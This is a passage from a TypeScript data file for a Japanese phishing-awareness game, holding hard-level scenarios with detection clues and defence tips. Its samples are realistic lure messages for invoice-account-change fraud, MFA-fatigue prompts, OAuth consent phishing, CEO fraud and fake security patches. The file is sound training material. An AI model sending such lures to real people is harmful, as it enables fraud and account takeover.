import { Scenario } from '../../types/game';

export const HARD_SCENARIOS: Scenario[] = [
  // ==========================================
  // HARD SCENARIOS (20 scenarios)
  // ==========================================
  {
    id: 'hard_01_bec_bank_typo',
    difficulty: 'hard',
    medium: 'email',
    title: '長期取引先からの振込口座変更依頼（タイポスクワッティング）',
    senderDisplay: '田中 宏 <h-tanaka@futurellnk-global.co.jp>',
    senderAddress: 'h-tanaka@futurellnk-global.co.jp',
    recipientDisplay: '経理部 支払担当者殿 <finance@aoba-next.jp>',
    subject: '【至急・口座変更のご案内】11月お支払い分のお振込先口座変更につきまして',
    timestamp: '本日 16:30',
    content: `アオバネクスト株式会社 経理部 支払担当者様

平素は格別のご高配を賜り厚く御礼申し上げます。
フューチャーリンク・グローバル株式会社 営業統括部の田中です。

さて、来月11月10日にお支払い予定となっております弊社向け業務委託料のお振込先口座につきまして、弊社のメインバンク統合に伴う口座整理のため、誠に恐縮ながら下記の指定口座へご変更をお願い申し上げます。

■ 新お振込先口座
銀行名：サクラ中央銀行（0005）
支店名：丸の内支店（010）
口座種別：普通
口座番号：8429184
口座名義：フューチャーリンク（カ

※今月中の変更手続きが完了しない場合、次回の着金消込に重大な遅延が発生する恐れがございます。
大変お手数ですが、変更受領の旨をご返信いただけますと幸いです。

フューチャーリンク・グローバル株式会社
田中 宏`,
    isSpoofed: true,
    attackType: '高度なビジネスメール詐欺（BEC：振込先口座変更詐欺）',
    headers: {
      'From': '田中 宏 <h-tanaka@futurellnk-global.co.jp>',
      'Reply-To': 'h-tanaka@futurellnk-global.co.jp',
      'DKIM-Signature': 'v=1; a=rsa-sha256; d=futurellnk-global.co.jp'
    },
    psychologicalTriggers: [
      {
        type: 'authority',
        label: '長年の正規取引先の信用',
        description: '実在する取引先の担当者名・文面様式を完全に模倣し、疑う理由を徹底的に隠蔽。'
      },
      {
        type: 'urgency',
        label: '支払遅延への懸念',
        description: '「着金消込に重大な遅延が発生する」と脅して、確認プロセスを省略させようとする。'
      }
    ],
    clues: [
      {
        id: 'clue_h1_typo',
        targetArea: 'sender',
        label: '1文字違いのドメイン（futurellnkの "LL"）',
        isSuspicious: true,
        explanation: '「futurelink」の「i（アイ）」が小文字の「l（エル）」にすり替えられた「futurellnk」という極めて巧妙なタイポスクワッティングです。'
      },
      {
        id: 'clue_h1_bank_protocol',
        targetArea: 'body',
        label: 'メール1本での振込先口座変更',
        isSuspicious: true,
        explanation: '世界中で何十億円もの被害を出しているBECの代表格です。振込先口座変更は、必ず過去の契約書記載の電話番号へコールバックして確認する義務があります。'
      }
    ],
    explanation: {
      summary: '企業の最も巨額な被害を招く「ビジネスメール詐欺（BEC：振込先口座変更）」です。',
      whySafeOrSpoofed: 'ドメインが正規の「futurelink-global」ではなく、「futurellnk-global」（iがlにすり替え）となっています。この口座に振り込むと数千万円単位の資金が海外口座へ持ち逃げされます。',
      psychologicalTrap: '丁寧なビジネス敬語と実在の担当者名を使うことで日常業務の隙を突きます。DKIM認証も悪意あるドメイン側で正規に署名されているため、機械的フィルタをすり抜けてきます。',
      checklistPoints: [
        'ドメインの文字を1文字ずつ丹念に照合する（lとi、oと0、rnとmの入れ替えに注意）',
        '振込先口座の変更連絡は、メールへの「返信」ではなく、以前から知っている電話番号へ必ず肉声で確認（コールバック）する',
        '社内規程に「メールのみによる振込先変更の禁止」を明文化する'
      ],
      defenseRule: '振込先変更依頼は、メールの返信ではなく、元から登録済みの電話番号へ必ず電話（コールバック）して二重確認する。'
    }
  },
  {
    id: 'hard_02_legit_internal_portal',
    difficulty: 'hard',
    medium: 'email',
    title: '社内人事部からの確定拠出年金（401k）見直し案内',
    senderDisplay: '人事総務部 年金管理チーム',
    senderAddress: 'jinji-nenkin@aoba-next.jp',
    recipientDisplay: 'アオバネクスト全社従業員各位',
    subject: '【定期ご案内】企業型確定拠出年金（401k）掛金拠出割合の年次見直しについて',
    timestamp: '本日 11:00',
    content: `従業員の皆様

お疲れ様です。人事総務部です。
本年度の企業型確定拠出年金（401k）における運用商品および掛金配分割合の年次見直し期間が近づいてまいりました。

変更を希望される方は、社内イントラネット「HRポータル」内の各種申請メニューより、11月20日（金）までにお手続きをお願いいたします。
（変更を希望されない場合、現在設定されている配分割合がそのまま継続されますので、ご対応は不要です）

■ 社内ポータル手続き画面（社内LAN/VPN接続必須）
https://portal.aoba-next.jp/hr/pension/annual-review-2026

ご質問等がございましたら、人事総務部（内線：2105 / 担当：木村）までお気軽にお問い合わせください。

人事総務部 労務厚生課`,
    isSpoofed: false,
    attackType: '正規の社内業務連絡',
    urlInfo: {
      displayText: 'https://portal.aoba-next.jp/hr/pension/annual-review-2026',
      actualUrl: 'https://portal.aoba-next.jp/hr/pension/annual-review-2026',
      isSuspicious: false
    },
    headers: {
      'From': '人事総務部 <jinji-nenkin@aoba-next.jp>',
      'Authentication-Results': 'spf=pass (local mailserver ip=10.0.1.25) dkim=pass'
    },
    psychologicalTriggers: [],
    clues: [
      {
        id: 'clue_h2_internal_domain',
        targetArea: 'url',
        label: '完全一致する社内ドメイン（portal.aoba-next.jp）',
        isSuspicious: false,
        explanation: '自社ドメイン（aoba-next.jp）の正規サブドメインであり、外部の不審なホストではありません。'
      },
      {
        id: 'clue_h2_no_coercion',
        targetArea: 'body',
        label: '「変更しない場合は対応不要」の明記',
        isSuspicious: false,
        explanation: '詐欺メールにありがちな「全員必須で今すぐ入力しろ」という強迫観念を植え付ける文言がなく、希望者のみの運用です。'
      },
      {
        id: 'clue_h2_contact',
        targetArea: 'body',
        label: '実在の担当部署・内線番号の明記',
        isSuspicious: false,
        explanation: '社内公式の既知の内線番号と担当者名が記載されており、照合が可能です。'
      }
    ],
    explanation: {
      summary: '正真正銘の「安全な社内正規業務通知」です。',
      whySafeOrSpoofed: '送信元および案内先URLが自社の正規ドメイン（aoba-next.jp）であり、社内LAN/VPN前提のセキュアな設計です。「変更不要なら対応不要」という合理的な案内がされています。',
      psychologicalTrap: 'セキュリティ意識が極端になると「社内ポータルへのリンクがあるだけで危険」と誤認して必要な年金手続きを見逃してしまう恐れがあります。ドメインの正当性と文面の妥当性を冷静に評価する力が問われます。',
      checklistPoints: [
        'URLのメインドメインが自社公式の「aoba-next.jp」と完全一致している',
        '無理な即時対応を強制せず、十分な猶予期間（約1ヶ月）が設けられている',
        '「社内LAN/VPN接続必須」というセキュアな前提が書かれている'
      ],
      defenseRule: '自社正規ドメインの社内イントラリンクであり、十分な猶予と担当者内線が明記された連絡は正規として手続きを進める。'
    }
  },
  {
    id: 'hard_03_mfa_fatigue_support',
    difficulty: 'hard',
    medium: 'chat',
    title: '深夜メンテナンスに伴うITヘルプデスクからの緊急対応チャット',
    senderDisplay: '社内ITセキュリティ推進室 (未認証ゲスト)',
    senderAddress: '@it_security_helpdesk_bot',
    recipientDisplay: '緊急アラートDM',
    timestamp: '本日 22:15',
    content: `【緊急システム対応】〇〇様

現在、深夜のゼロトラスト認証基盤メンテナンスに伴い、一部のアカウントでMFA（多要素認証）プッシュ通知の連続誤発報インシデントが発生しております。

お客様のスマートフォンにも、先ほどから認証アプリの「承認」プッシュ通知が複数回届いているかと存じます。
この不具合を解消しセッションを正常化するため、次に届くプッシュ通知画面で「承認」を1回タップしてください。
ご協力いただけない場合、深夜24時にアカウントがロックされます。

ITセキュリティ推進室 深夜当番`,
    isSpoofed: true,
    attackType: 'MFA疲労攻撃（MFA Fatigue）＋ 心理誘導ソーシャルエンジニアリング',
    psychologicalTriggers: [
      {
        type: 'confusion',
        label: '深夜の混乱と連続通知のストレス',
        description: '攻撃者がわざとMFA通知を何十回も連打し、被害者が辟易して「早く止めたい」と思う疲労を突く。'
      },
      {
        type: 'authority',
        label: 'ITセキュリティ推進室の偽装',
        description: '「メンテナンス」「セッション正常化」というテクニカルな用語で正当な保守作業に見せかける。'
      },
      {
        type: 'urgency',
        label: '深夜24時のアカウントロック脅迫',
        description: '深夜の判断力が低下した時間帯に期限を設けて思考を封じる。'
      }
    ],
    clues: [
      {
        id: 'clue_h3_mfa_request',
        targetArea: 'body',
        label: '「承認」をタップさせようとする指示',
        isSuspicious: true,
        explanation: '本物のIT部門が、障害解消のためにユーザーにMFAプッシュ通知の「承認」を押すよう依頼することは絶対にありません。承認を押した瞬間、攻撃者がログインに成功します。'
      },
      {
        id: 'clue_h3_guest',
        targetArea: 'sender',
        label: '「未認証ゲスト」からのチャット',
        isSuspicious: true,
        explanation: '社内公式のIT推進室ではなく、外部から侵入した未認証アカウントがアイコンと名前を偽装しています。'
      }
    ],
    explanation: {
      summary: '極めて悪質な「MFA疲労攻撃（MFA Fatigue）に便乗したなりすまし」です。',
      whySafeOrSpoofed: '攻撃者はすでにパスワードを入手しており、最後の関門である「二要素認証（スマホの承認）」を突破するために、通知を連打した上でITサポートを名乗って「承認を押して」と誘導しています。承認を押すとアカウントが乗っ取られます。',
      psychologicalTrap: '深夜にスマホが何度も鳴り響く「疲労・苛立ち」と、「システムエラーのせいだから1回承認すれば止まる」という甘い説明で、被害者自ら鍵を開けさせる巧妙な罠です。',
      checklistPoints: [
        '自分がログイン操作を行っていないのに届いたMFAプッシュ通知は、絶対に「承認」を押さない（「拒否」を押す）',
        '「不具合調査のため承認を押してください」というITサポート連絡は100%攻撃者の嘘',
        '深夜であっても承認せず、翌朝情シスに「不正ログイン試行の疑い」として即座に通報する'
      ],
      defenseRule: '自分が操作していないMFA通知は絶対に承認せず「拒否」を選択し、速やかにパスワードを変更する。'
    }
  },
  {
    id: 'hard_04_oauth_consent_abuse',
    difficulty: 'hard',
    medium: 'browser_alert',
    title: 'サードパーティ製クラウド連携アプリのアクセス権限リクエスト',
    senderDisplay: 'SmartMeeting AI Scheduler (サードパーティ)',
    senderAddress: 'accounts.omnicloud-portal.com/o/oauth2/v2/auth',
    recipientDisplay: 'OAuth 2.0 同意画面',
    timestamp: '本日 14:10',
    content: `「SmartMeeting AI Scheduler」が次の権限へのアクセスをリクエストしています：

✓ Omniカレンダーの予定の表示と管理
✓ OmniMailのすべてのメールの閲覧、作成、送信、完全な削除
✓ OmniDrive内のすべてのファイルの閲覧、編集、削除

デベロッパー情報：smartmeeting-scheduler-dev.site
（このアプリはプラットフォームによって確認されていません）`,
    isSpoofed: true,
    attackType: '悪意あるOAuthアプリ連携（Consent Phishing）',
    psychologicalTriggers: [
      {
        type: 'greed',
        label: '業務効率化・AIツールへの期待',
        description: '「会議を自動でAIが調整してくれる」という利便性で、要求されている危険な権限から目を逸らさせる。'
      },
      {
        type: 'confusion',
        label: '「公式の認可画面」という錯覚',
        description: '画面自体は公式のOAuth同意画面であるため、「公式画面だから安全だ」と誤認させる。'
      }
    ],
    clues: [
      {
        id: 'clue_h4_scope',
        targetArea: 'body',
        label: 'カレンダー調整アプリに「全メールの閲覧・削除」権限',
        isSuspicious: true,
        explanation: '日程調整ツールに、メールやクラウドストレージの「全データの閲覧・送信・完全な削除」という致命的な特権は明らかに不要（過剰権限）です。'
      },
      {
        id: 'clue_h4_unverified',
        targetArea: 'body',
        label: '「確認されていません」の警告',
        isSuspicious: true,
        explanation: 'プラットフォーム公式のセキュリティ審査を通過していない未検証のサードパーティアプリです。'
      }
    ],
    explanation: {
      summary: 'パスワード不要でアカウントを乗っ取る「不正OAuthアプリ（イルリジット・コンセント・フィッシング）」です。',
      whySafeOrSpoofed: '同意画面自体は本物の仕組みですが、連携しようとしている外部アプリが悪意あるトロイの木馬です。「許可」を押すと、パスワードを変更しても攻撃者が全メールや社内文書を盗み見・遠隔送信できるようになります。',
      psychologicalTrap: '「公式のポップアップだから安全」という思い込みを逆手に取り、日程調整とは無関係な「メール全削除・送受信」という恐ろしい権限をユーザー自身に承認させます。',
      checklistPoints: [
        'アプリの機能に対して、要求されている権限（スコープ）が過剰でないか厳密に確認する',
        '「このアプリは確認されていません」と出た場合は原則として連携を中断する',
        '会社のアカウントでは、情シスの事前承認がない野良サードパーティアプリを許可しない'
      ],
      defenseRule: 'アプリの目的から逸脱した過剰権限（全メール閲覧・ファイル削除等）を求めるOAuth連携は絶対に拒否する。'
    }
  },
  {
    id: 'hard_05_credit_card_legit_block',
    difficulty: 'hard',
    medium: 'email',
    title: 'セントラルカードからの不正利用検知・安全確認メール',
    senderDisplay: 'セントラルカード セキュリティセンター',
    senderAddress: 'sec-alert@central-card.co.jp',
    recipientDisplay: '会員各位',
    subject: '【重要】カードのご利用内容に関するご確認のお願い',
    timestamp: '本日 19:20',
    content: `いつもセントラルカードをご利用いただきありがとうございます。

弊社の不正利用検知システムにて、会員様のお取引に通常と異なる利用傾向（海外オンライン加盟店での連続試行）を検知いたしました。
現在、お客様のカード決済を安全確保のため一時的にお止めしております。

■ ご対応のお願い
お客様ご自身のご利用であるかを確認するため、大変お手数ですが下記いずれかの方法でご確認をお願いいたします。

1. 公式「CentralCardアプリ」を開き、トップのお知らせをご確認ください
2. クレジットカード裏面に記載されている「お問合せフリーダイヤル」までお電話ください

※セキュリティ保護のため、本メールにはパスワードやクレジットカード番号を直接入力させるリンクは掲載しておりません。

セントラルカード株式会社 セキュリティ管理部`,
    isSpoofed: false,
    attackType: '正規のカード不正利用防止通知',
    headers: {
      'From': 'セントラルカード <sec-alert@central-card.co.jp>',
      'Authentication-Results': 'spf=pass dkim=pass dmarc=pass'
    },
    psychologicalTriggers: [],
    clues: [
      {
        id: 'clue_h5_no_phishing_link',
        targetArea: 'body',
        label: '「カード情報入力を促すリンク」を一切排除している',
        isSuspicious: false,
        explanation: 'フィッシング詐欺と異なり、入力用URLを貼らず「公式アプリまたはカード裏面の番号に電話してください」と案内しています。'
      },
      {
        id: 'clue_h5_domain',
        targetArea: 'sender',
        label: '正規ドメイン（@central-card.co.jp）の認証パス',
        isSuspicious: false,
        explanation: '公式ドメインから送信されており、SPF/DKIM/DMARCのすべてがpassしています。'
      }
    ],
    explanation: {
      summary: '極めて安全で理想的な「クレジットカード会社の正規防犯通知」です。',
      whySafeOrSpoofed: '近年、大手カード会社はフィッシングと誤認されないよう、メール内にログイン用リンクを置かず「公式アプリ」または「カード裏面の電話番号」から確認するよう案内する運用に切り替えています。',
      psychologicalTrap: '「カード利用一時制限」という不吉な知らせに驚いて無視してしまうと、本当に第三者にカードを不正利用されていた場合に被害が拡大する恐れがあります。',
      checklistPoints: [
        'メール内にクレカ情報やパスワードを入れさせる不審なリンクがない',
        '「カード裏面の電話番号」という第三者が偽装できない物理的な確認先を案内している',
        '公式アプリを自分で立ち上げて状況を確認できる'
      ],
      defenseRule: '入力リンクのないカード停止警告は、カード裏面の電話番号または公式アプリで即座に事実確認を行う。'
    }
  },
  {
    id: 'hard_06_conference_speaker_invite',
    difficulty: 'hard',
    medium: 'email',
    title: '国際サイバーサミットからの基調講演招待',
    senderDisplay: 'Prof. Marcus Vance (Chair, Asia Cyber Summit 2026)',
    senderAddress: 'program-chair@asia-cyber-summit2026.net',
    recipientDisplay: 'dr-researcher@techtokyo-inst.ac.jp',
    subject: 'Keynote Speaker Invitation: Asia Cyber Summit 2026 (Tokyo)',
    timestamp: '昨日 23:45',
    content: `Dear Colleague,

Based on your remarkable recent research paper on human-centric security systems, our program committee would be deeply honored to invite you as an Exclusive Keynote Speaker at the Asia Cyber Summit 2026 (November 18-20, Tokyo).

All travel expenses and business-class accommodation will be fully covered by the summit foundation, along with an honorarium of $3,500 USD.

To review the tentative agenda and confirm your keynote slot, please review the private program portal:
https://asia-cyber-summit2026.net/speaker-portal/login?id=CONF_7821

Please finalize your acceptance within 48 hours so we may print the final symposium brochures.

Sincerely,
Prof. Marcus Vance
Program Committee Chair, Asia Cyber Summit 2026`,
    isSpoofed: true,
    attackType: '名誉・虚栄心誘導型スピアフィッシング（標的型攻撃）',
    urlInfo: {
      displayText: 'https://asia-cyber-summit2026.net/speaker-portal/login?id=CONF_7821',
      actualUrl: 'https://asia-cyber-summit2026.net/speaker-portal/login?id=CONF_7821',
      isSuspicious: true
    },
    psychologicalTriggers: [
      {
        type: 'greed',
        label: '名誉・自尊心（エゴ）のくすぐり',
        description: '「あなたの素晴らしい研究」「基調講演の打診」「ビジネスクラス全額負担」と自尊心を高揚させて警戒を解く。'
      },
      {
        type: 'urgency',
        label: '48時間以内のスロット確定',
        description: '「パンフレット印刷に間に合わない」と焦らせ、サミットの実在性を調べる時間を奪う。'
      }
    ],
    clues: [
      {
        id: 'clue_h6_domain',
        targetArea: 'sender',
        label: '最近取得された使い捨てサミットドメイン（.net）',
        isSuspicious: true,
        explanation: '世界的な学術会議を騙りながら、Whois情報で数日前に取得されたばかりの使い捨てドメインです。'
      },
      {
        id: 'clue_h6_portal',
        targetArea: 'url',
        label: '講演受諾にID/パスワード入力を求めるポータル',
        isSuspicious: true,
        explanation: '研究者や大学のアカウント情報を乗っ取るためのリバースプロキシ型フィッシングが仕掛けられています。'
      }
    ],
    explanation: {
      summary: '研究者や専門家を狙う「自尊心・名誉誘導型の標的型スピアフィッシング」です。',
      whySafeOrSpoofed: '実在しない架空の国際会議や偽装サイトを作成し、「基調講演をお願いしたい」と名誉欲を刺激して機関のログイン情報を詐取する攻撃です。',
      psychologicalTrap: '人は自分が高く評価されたり、特別な待遇（ビジネスクラス、高額謝礼）を提示されると、「騙されているかもしれない」と疑うことを無意識に避けてしまう心理的盲点を突かれます。',
      checklistPoints: [
        'サミットの名称をWebで検索し、学会組織の後援や公式サイトが存在するか調べる',
        '差出人の教授名の実在性と所属機関の公式プロフィールを照合する',
        '受諾確認のためにいきなりアカウント情報を入力させようとするページは絶対に入力しない'
      ],
      defenseRule: '特別な名誉や高額謝礼を伴う招待は、公式母体や差出人の実在性を外部検索で徹底調査する。'
    }
  },
  {
    id: 'hard_07_reply_to_trap',
    difficulty: 'hard',
    medium: 'email',
    title: '自社社長からの至急の極秘プロジェクト支援要請',
    senderDisplay: '浦山 健三 <ceo@aoba-next.jp>',
    senderAddress: 'ceo@aoba-next.jp',
    recipientDisplay: 'あなた宛て <user@aoba-next.jp>',
    subject: '【極秘・至急】新規M&Aプロジェクトに関する法務確認（他言無用）',
    timestamp: '本日 18:05',
    content: `〇〇さん

突然のメールですまない。
現在、社内でも極秘扱いのM&A案件が大詰めを迎えており、外部監査法人との緊急協議中だ。

君の所属部門での契約関連資料について、至急確認したい点がある。
社内秘のため、他の役員や上司には一切他言せず、このメールにそのまま返信してくれ。
折り返し、確認用の一時パスワードを送る。

アオバネクスト株式会社 代表取締役社長
浦山 健三`,
    isSpoofed: true,
    attackType: 'Reply-To偽装型 ビジネスメール詐欺（CEO詐欺）',
    headers: {
      'From': '浦山 健三 <ceo@aoba-next.jp>',
      'Reply-To': 'executive-sec-desk@sec-mail-relay.ch',
      'Return-Path': 'attacker-bounce@sec-mail-relay.ch'
    },
    psychologicalTriggers: [
      {
        type: 'authority',
        label: 'トップ（代表取締役社長）の絶対的権威',
        description: '社長本人からの直接連絡という強力な心理的重圧を与え、逆らえない状況を作る。'
      },
      {
        type: 'fear',
        label: '「極秘・他言無用」による周囲への相談封鎖',
        description: '「誰にも言うな」と命じることで、上司や情シスに相談されて嘘が発覚するのを防ぐ。'
      }
    ],
    clues: [
      {
        id: 'clue_h7_reply_to',
        targetArea: 'header',
        label: '返信先アドレス（Reply-To: sec-mail-relay.ch）',
        isSuspicious: true,
        explanation: '表示上の差出人は「ceo@aoba-next.jp」ですが、メールヘッダーの「Reply-To（返信先）」が外部の暗号化メール中継サービス「sec-mail-relay.ch」にすり替えられています。返信すると攻撃者に直通します。'
      },
      {
        id: 'clue_h7_isolation',
        targetArea: 'body',
        label: '「他言無用」「上司には言うな」という孤立化テクニック',
        isSuspicious: true,
        explanation: '詐欺師が最も恐れるのは「第三者への相談」です。相談を禁止する指示はソーシャルエンジニアリングの典型的な危険信号です。'
      }
    ],
    explanation: {
      summary: '返信先アドレスをすり替えた「高度なCEO詐欺（Reply-To偽装）」です。',
      whySafeOrSpoofed: '送信元表示（From）は本物の社長アドレスに見えますが、ヘッダーに「Reply-To: sec-mail-relay.ch」が仕込まれており、そのまま「返信」ボタンを押すと攻撃者のフリーメールに秘密情報が送られてしまいます。',
      psychologicalTrap: '「社長直々の極秘プロジェクトに抜擢された」という高揚感と、「他言無用」という口封じにより、周囲の同僚や情シスへの相談を自発的に止めてしまう心理トラップです。',
      checklistPoints: [
        'メールソフトの「返信先（Reply-To）」がFromと異なっていないか確認する',
        '「他言無用」「誰にも言うな」という指示が出た時は、セキュリティインシデントの可能性を最優先で疑う',
        '社長秘書室や直属の上司に「社長から極秘の連絡があったが事実か」を安全な別手段で確認する'
      ],
      defenseRule: '「他言無用・極秘」を理由に相談を禁じる役員メールは、返信先のヘッダーを確認し、秘書室等に直接事実確認する。'
    }
  },
  {
    id: 'hard_08_cert_malware_patch',
    difficulty: 'hard',
    medium: 'email',
    title: '社内CSIRTからの緊急ランサムウェア防止パッチ適用指示',
    senderDisplay: '社内CSIRTインシデント対応班 <csirt@aoba-soc-cert.jp>',
    senderAddress: 'csirt@aoba-soc-cert.jp',
    recipientDisplay: '全社従業員各位',
    subject: '【至急適用】全社PCにおけるランサムウェア侵入防止パッチの即時実行手順',
    timestamp: '本日 14:40',
    content: `全社従業員各位

社内セキュリティ監視センター（CSIRT）より緊急連絡です。
本日、社内ネットワーク宛てにゼロデイ脆弱性を突いたランサムウェア攻撃が検知されました。

感染拡大を防止するため、全社員は直ちに添付のバッチファイル（Emergency_Security_Fix.bat）をデスクトップに保存し、「管理者として実行」を行ってください。

添付ファイル：Emergency_Security_Fix.bat (42KB)

※本日16:00までに実行ログが確認できない端末は、社内LANから強制隔離遮断されます。

アオバネクストCSIRT 運用司令室`,
    isSpoofed: true,
    attackType: '偽セキュリティパッチ悪用（バッチファイル実行型攻撃）',
    attachmentInfo: {
      fileName: 'Emergency_Security_Fix.bat',
      fileSize: '42KB',
      isSuspicious: true,
      note: '実行すると攻撃者のC2サーバーからバックドアをダウンロードさせる悪意あるスクリプト'
    },
    psychologicalTriggers: [
      {
        type: 'authority',
        label: '社内CSIRT・専門防衛組織の権威',
        description: '「セキュリティのプロからの指示」として、一般社員が疑問を持たずに実行するように仕向ける。'
      },
      {
        type: 'fear',
        label: 'ネットワーク遮断とランサムウェア感染の恐怖',
        description: '「16時までにやらないと回線切断」とプレッシャーを与え、IT部門への問い合わせを阻止する。'
      }
    ],
    clues: [
      {
        id: 'clue_h8_bat',
        targetArea: 'attachment',
        label: 'メール添付の「.bat（バッチファイル）」実行指示',
        isSuspicious: true,
        explanation: '本物のCSIRTやIT部門が、一般ユーザーにメール添付の.batファイルを管理者権限で手動実行させることは絶対にありません。集中管理システム（MDMや資産管理ソフト）からサイレント配布されます。'
      },
      {
        id: 'clue_h8_domain',
        targetArea: 'sender',
        label: '不審な外部ドメイン（aoba-soc-cert.jp）',
        isSuspicious: true,
        explanation: '自社の正規ドメイン（aoba-next.jp）ではなく、それらしく作った外部ドメインです。'
      }
    ],
    explanation: {
      summary: '社内セキュリティ班を名乗って自らウイルスを実行させる「偽パッチ配布攻撃」です。',
      whySafeOrSpoofed: '「セキュリティ対策のためのファイル」と偽って悪質なスクリプト（.bat）を添付し、ユーザー自らの手で管理者権限を与えて侵入させる極めて危険な攻撃です。',
      psychologicalTrap: '「ランサムウェアを防ぐため」「やらないとネットワーク遮断」という強い恐怖を植え付け、疑う間もなく実行させようとします。',
      checklistPoints: [
        'メール添付のバッチファイル（.bat / .ps1 / .vbs / .exe）は絶対に実行しない',
        '企業の正規セキュリティパッチは情シスが集中管理システムから自動配布する',
        '自社正規ドメイン（aoba-next.jp）以外のCSIRTアドレスからの指示は詐欺'
      ],
      defenseRule: '「セキュリティパッチ」を名乗る添付ファイル（.batや.exe）は絶対に実行せず、情シスに即座に通報する。'
    }
  },
  {
    id: 'hard_09_legal_copyright_threat',
    difficulty: 'hard',
    medium: 'email',
    title: '法律事務所からの商標権・著作権侵害警告クレーム',
    senderDisplay: 'オオクラ総合法律事務所 弁護士 大倉 俊介',
    senderAddress: 'shunsuke.okura@okura-law-partners.tokyo',
    recipientDisplay: 'アオバネクスト株式会社 法務担当者様',
    subject: '【警告書】貴社ウェブサイトにおける著作権および商標権侵害について',
    timestamp: '本日 17:05',
    content: `アオバネクスト株式会社 法務担当者様

冠省
当職は、〇〇株式会社の代理人弁護士として本通知を送付いたします。

貴社が運営する公式ウェブサイトおよび製品カタログにおいて、当職クライアントが保有する登録商標および著作物たる写真画像が無断で使用されていることを確認いたしました。

侵害該当箇所および証拠キャプチャ一覧を下記クラウドストレージに保存しております。
直ちにご確認いただき、24時間以内に侵害コンテンツの削除および損害賠償についての回答書をご送付ください。

▼ 侵害証拠ファイル（パスワード保護ストレージ）
https://cloud-evidence-vault.top/cases/docket_2026_9812.iso

期限内に誠意あるご対応をいただけない場合、東京地方裁判所へ仮処分命令申立および損害賠償請求訴訟を提起いたします。

オオクラ総合法律事務所
弁護士 大倉 俊介`,
    isSpoofed: true,
    attackType: '著作権クレーム偽装型標的型攻撃（ISOイメージ悪用）',
    urlInfo: {
      displayText: 'https://cloud-evidence-vault.top/cases/docket_2026_9812.iso',
      actualUrl: 'https://cloud-evidence-vault.top/cases/docket_2026_9812.iso',
      isSuspicious: true
    },
    psychologicalTriggers: [
      {
        type: 'fear',
        label: '訴訟提起・損害賠償の強い脅迫',
        description: '「裁判所に訴訟を起こす」という法律用語の威嚇でパニックを起こさせる。'
      },
      {
        type: 'authority',
        label: '弁護士・法律事務所の権威',
        description: '弁護士名や法律事務所の体裁を取ることで、法務や広報担当者を強く萎縮させる。'
      }
    ],
    clues: [
      {
        id: 'clue_h9_iso',
        targetArea: 'url',
        label: '証拠ファイルが「.iso（ディスクイメージ）」形式',
        isSuspicious: true,
        explanation: 'URLの末尾が「.iso」です。本物の弁護士が証拠資料をISOディスクイメージで送ることはあり得ません。Windowsのセキュリティ警告（Mark of the Web）を迂回してランサムウェアを仕込む攻撃手口です。'
      },
      {
        id: 'clue_h9_domain',
        targetArea: 'url',
        label: '保存先が格安ドメイン（.top）',
        isSuspicious: true,
        explanation: '法律事務所の公的証拠が「.top」などの無料・格安ドメインに置かれることはありません。'
      }
    ],
    explanation: {
      summary: '著作権侵害クレームを装って悪意あるISOファイルを落とさせる「標的型スピアフィッシング」です。',
      whySafeOrSpoofed: '法律事務所を名乗り「裁判を起こす」と脅して、証拠と偽った「.isoファイル」をダウンロードさせます。開くとPCがランサムウェアに感染し社内ネットワーク全体が暗号化されます。',
      psychologicalTrap: '「訴訟」「損害賠償」という企業の信用に関わる重大な威嚇で広報や法務担当者をパニックに陥れ、ファイル形式の異常（.iso）に気付かせないようにします。',
      checklistPoints: [
        '資料や証拠と称して「.iso」「.vhd」「.exe」「.scr」などのファイル形式を渡されたら100%攻撃',
        '法律事務所の実在性を日本弁護士連合会の公式検索で照合する',
        'メール内URLを開かず、事務所の公式電話番号を自分で調べて事実確認を行う'
      ],
      defenseRule: '法律クレームメール記載のリンク先にある.isoや.exeファイルは絶対にダウンロード・開封しない。'
    }
  },
  {
    id: 'hard_10_legit_bank_kyc',
    difficulty: 'hard',
    medium: 'email',
    title: 'セントラル大洋銀行からの定期的取引確認（KYC）案内',
    senderDisplay: 'セントラル大洋銀行 マネー・ローンダリング対策室',
    senderAddress: 'kyc-notification@central-taiyo-bank.co.jp',
    recipientDisplay: '法人取引ご担当者様',
    subject: '【重要】「犯罪による収益の移転防止に関する法律」に基づくお取引目的等の定期確認のお願い',
    timestamp: '2026年10月27日 10:00',
    content: `アオバネクスト株式会社 御中
お取引ご担当者様

いつもセントラル大洋銀行をご利用いただき誠にありがとうございます。

金融庁のガイドラインおよび「犯罪による収益の移転防止に関する法律」に基づき、当行ではすべてのお取引先法人様へ定期的な「お取引目的・事業内容等のご確認」をお願いしております。

■ ご回答のお願い
今月下旬より、当行にお届けいただいている貴社本社ご住所宛てに「お取引内容等確認シート」を郵送にてお送りいたします。
同封の返信用封筒にてご返送いただくか、公式法人インターネットバンキングに直接ログインの上、トップページの「定期確認アンケート」バナーよりご回答をお願い申し上げます。

※セキュリティ保護のため、本メールにはパスワードや口座暗証番号を入力させるリンクは一切掲載しておりません。
当行を装った不審なメールや偽サイトにご注意ください。

セントラル大洋銀行 法人営業統括部`,
    isSpoofed: false,
    attackType: '正規の銀行コンプライアンス定期確認通知',
    headers: {
      'From': 'セントラル大洋銀行 <kyc-notification@central-taiyo-bank.co.jp>',
      'Authentication-Results': 'spf=pass dkim=pass dmarc=pass'
    },
    psychologicalTriggers: [],
    clues: [
      {
        id: 'clue_h10_no_link',
        targetArea: 'body',
        label: '入力リンクを完全排除し「郵送または公式IB直接ログイン」と案内',
        isSuspicious: false,
        explanation: 'フィッシング詐欺と異なり、メール内にリンクを貼らず「郵送の書類」または「ブックマークした正規インターネットバンキングから直接確認」するよう案内しています。'
      },
      {
        id: 'clue_h10_domain',
        targetArea: 'sender',
        label: '正規ドメイン（@central-taiyo-bank.co.jp）',
        isSuspicious: false,
        explanation: '銀行の正規ドメインから厳格な電子署名（DKIM/DMARC pass）を伴って送信されています。'
      }
    ],
    explanation: {
      summary: '極めてセキュアな「金融機関の正規定期取引確認（KYC）案内」です。',
      whySafeOrSpoofed: 'フィッシング詐欺と誤認されないよう、メール本文に入力用URLを一切置かず、「郵送の書面」または「公式バンキングへの直接ログイン」という安全な別ルートを明記しています。',
      psychologicalTrap: '法律名やマネロン対策という堅苦しいタイトルを見て「これも詐欺メールだろう」と即座に破棄してしまうと、実際の口座利用停止などの業務支障を招く恐れがあります。',
      checklistPoints: [
        'メール内に口座情報や暗証番号を入れさせるリンクが一切存在しない',
        '「郵送での書面案内」または「公式ログイン」という偽装できない安全な手段が指定されている',
        '送信元ドメインが金融機関の公式ドメインと完全一致している'
      ],
